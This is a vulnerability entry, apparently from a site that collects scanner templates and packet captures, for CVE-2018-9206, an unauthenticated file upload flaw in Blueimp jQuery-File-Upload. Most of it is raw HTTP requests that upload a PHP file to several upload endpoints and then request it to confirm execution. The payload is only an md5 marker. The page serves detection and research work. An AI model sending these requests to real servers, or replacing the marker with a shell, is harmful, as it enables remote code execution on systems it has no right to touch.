---
layout: "post"
cve_id: "CVE-2018-9206"
title: "Blueimp jQuery-File-Upload v9.22.0 - Unrestricted File Upload"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-9206.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-9206.yaml"
author: "thewindghost"
severity: "critical"
impact: "Attackers can upload malicious files, potentially leading to remote code execution or server compromise.
"
remediation: "Update to the latest version of Blueimp jQuery-File-Upload.
"
reference:
  - "https://www.exploit-db.com/exploits/45790"
  - "https://www.exploit-db.com/exploits/46182/"
  - "https://github.com/blueimp/jQuery-File-Upload/pull/3514"
  - "https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/jquery_file_upload.rb"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2018-9206', 'epss-score': 0.93931, 'epss-percentile': 0.9987, 'cwe-id': 'CWE-434'}"
metadata: "{'verified': True}"
tags:
  - "cve"
  - "cve2018"
  - "jquery"
  - "file-upload"
  - "rce"
  - "intrusive"
  - "vkev"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Blueimp jQuery-File-Upload v9.22.0 contains an unauthenticated arbitrary file upload caused by insufficient validation in the upload component, letting remote attackers upload malicious files, exploit requires no authentication.


## üåê HTTP Request
```nohighlight
POST /jQuery-File-Upload/server/php/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.6
Content-Length: 253
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Accept-Encoding: gzip

------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Content-Disposition: form-data; name="files[]"; filename="eHcjxpei.php"
Content-Type: application/x-php

<?php echo md5("CVE-2018-9206"); ?>
------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g--
```

```nohighlight
GET /files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /example/upload.php/files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept-Encoding: gzip
```

```nohighlight
GET /files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15
Accept-Encoding: gzip
```

```nohighlight
GET /files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
POST /php/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Content-Length: 253
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Accept-Encoding: gzip

------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Content-Disposition: form-data; name="files[]"; filename="eHcjxpei.php"
Content-Type: application/x-php

<?php echo md5("CVE-2018-9206"); ?>
------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g--
```

```nohighlight
GET /jquery-file-upload/server/php/index.php/files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept-Encoding: gzip
```

```nohighlight
GET /files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /php/index.php/files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
POST /server/php/upload.class.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Content-Length: 253
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Accept-Encoding: gzip

------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Content-Disposition: form-data; name="files[]"; filename="eHcjxpei.php"
Content-Type: application/x-php

<?php echo md5("CVE-2018-9206"); ?>
------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g--
```

```nohighlight
GET /server/php/UploadHandler.php/files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ko-KR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27
Accept-Encoding: gzip
```

```nohighlight
POST /server/php/UploadHandler.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Length: 253
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Accept-Encoding: gzip

------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Content-Disposition: form-data; name="files[]"; filename="eHcjxpei.php"
Content-Type: application/x-php

<?php echo md5("CVE-2018-9206"); ?>
------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g--
```

```nohighlight
POST /jquery-file-upload/server/php/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15
Content-Length: 253
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Accept-Encoding: gzip

------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Content-Disposition: form-data; name="files[]"; filename="eHcjxpei.php"
Content-Type: application/x-php

<?php echo md5("CVE-2018-9206"); ?>
------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g--
```

```nohighlight
POST /example/upload.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363
Content-Length: 253
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Accept-Encoding: gzip

------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g
Content-Disposition: form-data; name="files[]"; filename="eHcjxpei.php"
Content-Type: application/x-php

<?php echo md5("CVE-2018-9206"); ?>
------WebKitFormBoundary38CE6ARi1YPSN9u4oMcAPhVMZ6g--
```

```nohighlight
GET /jQuery-File-Upload/server/php/index.php/files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept-Encoding: gzip
```

```nohighlight
GET /files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept-Encoding: gzip
```

```nohighlight
GET /server/php/upload.class.php/files/eHcjxpei.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15
Accept-Encoding: gzip
```

